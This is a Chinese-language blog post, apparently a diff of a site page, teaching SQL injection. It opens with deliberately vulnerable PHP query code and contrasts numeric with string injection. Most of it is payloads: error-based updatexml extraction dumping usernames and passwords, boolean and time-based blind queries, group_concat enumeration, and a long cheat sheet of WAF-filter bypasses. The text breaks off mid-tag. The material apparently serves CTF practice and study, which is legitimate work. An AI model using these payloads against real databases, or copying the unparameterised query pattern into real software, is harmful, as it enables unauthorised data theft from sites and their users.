+<p>从注入类型来划分讲。</p>
+<h2 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h2><p>也就是不用闭合，用户的输入直接被解析成了新的SQL语句。</p>
+<p>从代码层面来看如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id + <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>从上图可以看到<strong>id是以+直接进行拼接的</strong>，这样我们就可以从直接给id，SQL语句让他直接执行以此产生SQL注入。</p>
+<h2 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h2><p>字符型就要进行闭合，并且闭合是非常关键的。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>在第8行可以清晰的看到id被单引号包围起来，如果想要响应自己想要执行的SQL语句就执行如下：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;or 1=1#</span></span><br></pre></td></tr></table></figure>
+
+
+<p>因为<strong>引号的就近匹配</strong>，所以单引号会和左边最近的符号匹配。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;&#x27;or 1=1#&#x27;;&quot;;</span><br></pre></td></tr></table></figure>
+
+
+<p><code>&quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;&#39;</code> 此部分自成一块</p>
+<p><code>#&#39;;&quot;;</code> #之后被注释。</p>
+<p>因此你输入的SQL语句<strong>将被独立代入MySQL数据库解析</strong>，以此达到注入的效果。</p>
+<p>之后的按照注入点划分，也要判断数字型和字符型，以此类推。注入语句将放在后面统一讲。</p>
+<h2 id="叠堆注入"><a href="#叠堆注入" class="headerlink" title="叠堆注入"></a>叠堆注入</h2><p>笼统的讲，叠堆注入也是联合注入。</p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>测试时发现会<strong>回显报错信息</strong>，就可以试试报错注入。</p>
+<ul>
+<li>报错注入主要用到3个函数<ul>
+<li>floor()</li>
+<li>extractvalue()</li>
+<li>updatexml()</li>
+</ul>
+</li>
+</ul>
+<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><ul>
+<li><p>数据库</p>
+  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;or(updatexml(1,concat(0x7e,(</span></span><br><span class="line"><span class="string">database()</span></span><br><span class="line"><span class="string">),0x7e),1))or&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>表</p>
+  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;or(updatexml(1,concat(0x7e,(</span></span><br><span class="line"><span class="string">select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;</span>cat<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">),0x7e),1))or&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>列名</p>
+  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;or(updatexml(1,concat(0x7e,(</span></span><br><span class="line"><span class="string">select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>H4rDsq1<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">),0x7e),1))or&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>dump</p>
+  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">’or(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(group_concat(id,username,password))from(geek.H4rDsq1)</span><br><span class="line">),<span class="number">0x7e</span>),<span class="number">1</span>))or<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>其他几个函数以此类推，<strong>绕WAF根据数据库版本换成数学函数。</strong></p>
+<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p><strong>根据页面的回显不同来判断</strong>。</p>
+<p>Payload</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">爆库名：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left((select database()),1)=&#x27;</span>s<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string">爆表名：?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">left</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span><span class="string">&#x27;security&#x27;</span> limit <span class="number">3</span>,<span class="number">1</span>),<span class="number">5</span>)<span class="operator">=</span><span class="string">&#x27;users&#x27;</span><span class="comment">--+</span></span><br><span class="line">爆列明：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 1,1),8)=&#x27;</span>username<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string">爆数据：?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">left</span>((<span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> id limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">4</span>)<span class="operator">=</span><span class="string">&#x27;dumb&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>根据回显时间的不同来判断。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if((<span class="number">1</span>)<span class="keyword">like</span>(<span class="number">1</span>),<span class="number">5</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+
+<p>Payload</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">爆库长：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(length(database())=8,sleep(5),NULL)--+</span></span><br><span class="line"><span class="string">爆库名：?id=1&#x27;</span> <span class="keyword">and</span> if(<span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span>,sleep(<span class="number">5</span>),<span class="keyword">NULL</span>)<span class="comment">--+</span></span><br><span class="line">爆表名：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#x27;</span>r<span class="string">&#x27;,sleep(5),NULL)--+</span></span><br><span class="line"><span class="string">爆列明：?id=1&#x27;</span> <span class="keyword">and</span> if(<span class="keyword">left</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="operator">=</span> <span class="string">&#x27;users&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">8</span>)<span class="operator">=</span><span class="string">&#x27;username&#x27;</span>,sleep(<span class="number">5</span>),<span class="keyword">NULL</span>)<span class="comment">--+</span></span><br><span class="line">爆数据：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(left((select username from users order by id limit 0,1),4)=&#x27;</span>dumb<span class="string">&#x27;,sleep(5),NULL)--+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> if(<span class="keyword">left</span>((<span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> id limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">4</span>)<span class="operator">=</span><span class="string">&#x27;dumb&#x27;</span>,sleep(<span class="number">5</span>),<span class="keyword">NULL</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+
+<p>其他皆可以此类推。</p>
+<h1 id="group-concat的使用"><a href="#group-concat的使用" class="headerlink" title="group_concat的使用"></a>group_concat的使用</h1><p>**mysql版本&gt;5.0切使用了information_schema数据库  **</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(SCHEMA_NAME) <span class="keyword">from</span> (information_schema.schemata )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> (information_schema.columns) <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x61646D696E75736572</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> group_concat(flag) <span class="keyword">from</span> sqli.flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>其他以此类推。</p>
+<h1 id="SQL注入绕过速查表"><a href="#SQL注入绕过速查表" class="headerlink" title="SQL注入绕过速查表"></a>SQL注入绕过速查表</h1><h2 id="过滤and-or"><a href="#过滤and-or" class="headerlink" title="过滤and or"></a>过滤and or</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span>     ——<span class="operator">&gt;</span>    <span class="operator">||</span></span><br><span class="line"><span class="keyword">and</span>     ——<span class="operator">&gt;</span>    <span class="operator">&amp;&amp;</span></span><br><span class="line">xor ——<span class="operator">&gt;</span> <span class="operator">|</span>   </span><br><span class="line"><span class="keyword">not</span> ——<span class="operator">&gt;</span> <span class="operator">!</span></span><br><span class="line"></span><br><span class="line">十六进制绕过</span><br><span class="line"><span class="keyword">or</span> ——<span class="operator">&gt;</span> o\x72</span><br><span class="line"></span><br><span class="line">大小写绕过</span><br><span class="line"><span class="keyword">Or</span></span><br><span class="line"><span class="keyword">aNd</span></span><br><span class="line"></span><br><span class="line">双写绕过</span><br><span class="line">oorr</span><br><span class="line">anandd</span><br><span class="line"></span><br><span class="line">urlencode，ascii(<span class="type">char</span>)，hex，unicode编码绕过</span><br><span class="line">    一些unicode编码举例：</span><br><span class="line">    单引号：<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    %u0027 %u02b9 %u02bc</span></span><br><span class="line"><span class="string">    %u02c8 %u2032</span></span><br><span class="line"><span class="string">    %uff07 %c0%27</span></span><br><span class="line"><span class="string">    %c0%a7 %e0%80%a7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">关键字内联注释尝试绕所有</span></span><br><span class="line"><span class="string">/*!or*/</span></span><br><span class="line"><span class="string">/*!and*/</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="左括号过滤"><a href="#左括号过滤" class="headerlink" title="左括号过滤"></a>左括号过滤</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">urlencode，ascii(<span class="type">char</span>)，hex，unicode编码绕过</span><br><span class="line"><span class="operator">%</span>u0028 <span class="operator">%</span>uff08</span><br><span class="line"><span class="operator">%</span>c0<span class="operator">%</span><span class="number">28</span> <span class="operator">%</span>c0<span class="operator">%</span>a8</span><br><span class="line"><span class="operator">%</span>e0<span class="operator">%</span><span class="number">80</span><span class="operator">%</span>a8</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="过滤union-select"><a href="#过滤union-select" class="headerlink" title="过滤union\select"></a>过滤union\select</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">例：</span><br><span class="line">过滤代码 <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,password <span class="keyword">from</span> users</span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">where</span> userid<span class="operator">=</span><span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line">十六进制字符绕过</span><br><span class="line"><span class="keyword">select</span> ——<span class="operator">&gt;</span> selec\x74</span><br><span class="line"><span class="keyword">union</span>——<span class="operator">&gt;</span>unio\x6e</span><br><span class="line"></span><br><span class="line">大小写绕过</span><br><span class="line"><span class="keyword">SelEct</span></span><br><span class="line"></span><br><span class="line">双写绕过</span><br><span class="line">selselectect</span><br><span class="line">uniunionon</span><br><span class="line"></span><br><span class="line">urlencode，ascii(<span class="type">char</span>)，hex，unicode编码绕过</span><br><span class="line"></span><br><span class="line">关键字内联绕所有</span><br><span class="line"><span class="comment">/*!union*/</span></span><br><span class="line"><span class="comment">/*!select*/</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">用Tab代替空格<span class="operator">%</span><span class="number">20</span> <span class="operator">%</span><span class="number">09</span> <span class="operator">%</span><span class="number">0</span>a <span class="operator">%</span><span class="number">0</span>b <span class="operator">%</span><span class="number">0</span>c <span class="operator">%</span><span class="number">0</span>d <span class="operator">%</span>a0 <span class="comment">/**/</span>()</span><br><span class="line">绕过空格注释符绕过<span class="operator">/</span><span class="operator">/</span><span class="comment">--%20/**/#--+-- -;%00;</span></span><br><span class="line"></span><br><span class="line">空白字符绕过SQLite3  ——     <span class="number">0</span>A,<span class="number">0</span>D,<span class="number">0</span>c,<span class="number">09</span>,<span class="number">20</span></span><br><span class="line">MYSQL</span><br><span class="line">    <span class="number">09</span>,<span class="number">0</span>A,<span class="number">0</span>B,<span class="number">0</span>B,<span class="number">0</span>D,A0,<span class="number">20</span></span><br><span class="line">PosgressSQL</span><br><span class="line">    <span class="number">0</span>A,<span class="number">0</span>D,<span class="number">0</span>C,<span class="number">09</span>,<span class="number">20</span></span><br><span class="line">Oracle_11g</span><br><span class="line">    <span class="number">00</span>,<span class="number">0</span>A,<span class="number">0</span>D,<span class="number">0</span>C,<span class="number">09</span>,<span class="number">20</span></span><br><span class="line">MSSQL</span><br><span class="line">    <span class="number">01</span>,<span class="number">02</span>,<span class="number">03</span>,<span class="number">04</span>,<span class="number">05</span>,<span class="number">06</span>,<span class="number">07</span>,<span class="number">08</span>,<span class="number">09</span>,<span class="number">0</span>A,<span class="number">0</span>B,<span class="number">0</span>C,<span class="number">0</span>D,<span class="number">0</span>E,<span class="keyword">OF</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">1</span>A,<span class="number">1</span>B,<span class="number">1</span>C,<span class="number">1</span>D,<span class="number">1</span>E,<span class="number">1</span>F,<span class="number">20</span></span><br><span class="line">特殊符号绕过</span><br><span class="line">    `  <span class="operator">+</span>  ！</span><br><span class="line">等科学计数法绕过</span><br><span class="line">    例：</span><br><span class="line">    <span class="keyword">select</span> <span class="keyword">user</span>,password <span class="keyword">from</span> users <span class="keyword">where</span> user_id0e1union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line">unicode编码</span><br><span class="line">    <span class="operator">%</span>u0020 <span class="operator">%</span>uff00</span><br><span class="line">    <span class="operator">%</span>c0<span class="operator">%</span><span class="number">20</span> <span class="operator">%</span>c0<span class="operator">%</span>a0 <span class="operator">%</span>e0<span class="operator">%</span><span class="number">80</span><span class="operator">%</span>a0</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="过滤-x3D"><a href="#过滤-x3D" class="headerlink" title="过滤&#x3D;"></a>过滤&#x3D;</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or 1 like 1#可以绕过对 = &gt; 等过滤</span></span><br><span class="line"><span class="string">or &#x27;</span><span class="number">1</span><span class="string">&#x27; IN (&#x27;</span><span class="number">1234</span><span class="string">&#x27;)#可以替代=</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="过滤比较符-lt-gt"><a href="#过滤比较符-lt-gt" class="headerlink" title="过滤比较符&lt;&gt;"></a>过滤比较符&lt;&gt;</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="operator">*</span>fromuserswhereid<span class="operator">=</span><span class="number">1</span><span class="keyword">and</span> ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span><span class="operator">*</span>fromuserswhereid<span class="operator">=</span><span class="number">1</span><span class="keyword">and</span> greatest(ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)<span class="operator">=</span><span class="number">64</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="过滤where"><a href="#过滤where" class="headerlink" title="过滤where"></a>过滤where</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">where</span> user_id <span class="operator">=</span> <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users limit <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="过滤limit"><a href="#过滤limit" class="headerlink" title="过滤limit"></a>过滤limit</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users limit <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> user_id <span class="keyword">having</span> user_id <span class="operator">=</span> <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span>#user_id聚合中user_id为<span class="number">1</span>的<span class="keyword">user</span>为admin</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="过滤group-by"><a href="#过滤group-by" class="headerlink" title="过滤group by"></a>过滤group by</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> user_id <span class="keyword">having</span> user_id <span class="operator">=</span> <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> substr(group_concat(user_id),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">user</span> <span class="keyword">from</span> users ) <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="过滤select"><a href="#过滤select" class="headerlink" title="过滤select"></a>过滤select</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> substr(group_concat(user_id),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">user</span> <span class="keyword">from</span> users ) <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="过滤’-单引号"><a href="#过滤’-单引号" class="headerlink" title="过滤’(单引号)"></a>过滤’(单引号)</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">waf <span class="operator">=</span> <span class="string">&#x27;and|or|union|where|limit|group by|select|\&#x27;&#x27;</span></span><br><span class="line"><span class="string">过滤代码 1 &amp;&amp; substr(user,1,1) = &#x27;</span>a<span class="string">&#x27;</span></span><br><span class="line"><span class="string">绕过方式 1 &amp;&amp; user_id is not null1 &amp;&amp; substr(user,1,1) = 0x611 &amp;&amp; substr(user,1,1) = unhex(61)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">宽字节绕过</span></span><br><span class="line"><span class="string">%bf%27 %df%27 %aa%27</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用<span class="keyword">from</span> <span class="keyword">to</span>的方式来解决：</span><br><span class="line">selectsubstr(database(<span class="number">0</span>from1for1);selectmid(database(<span class="number">0</span>from1for1);</span><br><span class="line"></span><br><span class="line">对于limit可以使用<span class="keyword">offset</span>来绕过：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span><span class="operator">*</span>fromnews limit0,<span class="number">1</span># 等价于下面这条<span class="keyword">SQL</span>语句<span class="keyword">select</span><span class="operator">*</span>fromnews limit1offset0</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="过滤hex"><a href="#过滤hex" class="headerlink" title="过滤hex"></a>过滤hex</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> unhex(<span class="number">61</span>)</span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="built_in">lower</span>(conv(<span class="number">11</span>,<span class="number">10</span>,<span class="number">16</span>)) #十进制的<span class="number">11</span>转化为十六进制，并小写。</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="过滤substr"><a href="#过滤substr" class="headerlink" title="过滤substr"></a>过滤substr</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line"></span><br><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="built_in">lower</span>(conv(<span class="number">11</span>,<span class="number">10</span>,<span class="number">16</span>)) </span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> lpad(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">in</span> <span class="string">&#x27;r&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>利用urlencode，ascii(char)，hex，unicode等编码绕过</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>即<span class="operator">%</span><span class="number">6</span>f<span class="operator">%</span><span class="number">72</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">3</span>d<span class="operator">%</span><span class="number">31</span>，而Test也可以为<span class="type">CHAR</span>(<span class="number">101</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">97</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">115</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">116</span>)。</span><br><span class="line"></span><br><span class="line">十六进制编码</span><br><span class="line"><span class="keyword">SELECT</span>(extractvalue(<span class="number">0x3C613E61646D696E3C2F613E</span>,<span class="number">0x2f61</span>))</span><br><span 